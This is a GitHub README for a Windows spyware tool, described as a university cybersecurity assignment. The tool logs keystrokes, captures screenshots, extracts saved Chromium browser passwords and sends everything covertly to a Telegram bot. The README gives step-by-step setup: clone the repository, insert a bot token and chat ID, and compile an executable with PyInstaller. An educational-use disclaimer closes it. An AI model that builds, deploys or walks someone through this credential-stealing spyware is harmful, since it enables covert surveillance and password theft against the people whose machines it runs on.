# Spyware Project with Telegram Bot for Windows  

This project was developed as part of a university cybersecurity assignment to demonstrate how basic programming knowledge can be used to create potentially harmful tools. Specifically, this project is a spyware with communication capabilities through a Telegram bot, designed specifically for the Windows operating system. The goal is to show how quickly and effectively such tools can be developed, even by individuals with basic programming knowledge.

## Project Objective  

The purpose of this project is twofold:  

1. **Demonstrate technical accessibility**: Show how a tool like spyware can be developed by anyone with basic programming skills, highlighting the importance of strengthening system security.  
2. **Analyze security implications**: Provide a controlled environment to understand how such tools work, assess the associated risks, and explore strategies to mitigate these threats.  

## Features  

- **Sensitive Data Capture**: Collects data such as keystrokes, screenshots, system information, and all saved passwords in Chromium-based browsers.
  
- **Communication via Telegram**: Uses a Telegram bot to securely send the collected data in real-time to a predefined channel.
  
- **Windows Compatibility**: Specifically designed to operate in Windows environments, leveraging system features to run discreetly.

## Installation

1. **Clone the repository:**
   ```bash
   git clone https://github.com/llucgalceee/Swiper_Spyware.git
   ```
  
2. **Set up the Telegram bot token**:  
   - Create a bot on Telegram using BotFather.  
   - Copy your token and paste it into the code in `main_spyware.py` where the bot is initialized.

   <img src="https://github.com/user-attachments/assets/1dd23135-165a-4f01-be67-d1041106f341" width="300" height="500">
   
3. **Copy your ChatID**:  
   Copy your `chat_id="131933xxxx"` and paste it into `funciones_asyncronas.py`.

4. **Make sure Python is installed**:  
   This project requires Python to run. Ensure you have Python 3.x installed on your system. You can download Python from https://www.python.org/downloads.

5. **Run the build script**:  
   Double-click on `build.bat` to compile the program.

## How to use

Double-click the generated `.exe` file to run the program in the `dist` folder.

# Errors  

## Step 1: Add the Python Scripts PATH to Environment Variables in Windows  

1. **Locate and Copy the Path to the Scripts Folder**:  
   Depending on your Python installation, the Scripts folder path could be:  
    ```bash
   C:\Users\USER\AppData\Local\Programs\Python\Python312\Scripts
    ```
    
   Or:
   
    ```bash
    C:\Users\USER\AppData\Local\Packages\PythonSoftwareFoundation.Python.3.11_qbz5n2kfra8p0\LocalCache\local-packages\Python311\Scripts
    ```

3. **Open Environment Variables in the Control Panel**:  
- Search for "Environment Variables" in the Control Panel.  
- Find the `PATH` variable, select it, and click **Edit**.  
- Add a new line with the Scripts folder path you copied earlier.  

**Example of Adding the PATH:**  
![Environment Variables Example](https://github.com/user-attachments/assets/5c7972bf-6f3c-4054-838b-d646477b1d03)  

## Step 2: Alternative Solution  

If adding the PATH does not work, try executing the command directly. Use one of the following commands based on your Python version and installation path:  
```bash
C:\Users\USER\AppData\Local\Programs\Python\Python312\Scripts\pyinstaller.exe build.spec
```
Or:
```bash
C:\Users\USER\AppData\Local\Packages\PythonSoftwareFoundation.Python.3.11_qbz5n2kfra8p0\LocalCache\local-packages\Python311\Scripts\pyinstaller.exe build.spec
```

---

## Disclaimer  

:warning: **Warning:**  
This project is for **educational purposes** and **security testing** in authorized environments only. Unauthorized use of this tool may be illegal and is strictly prohibited.


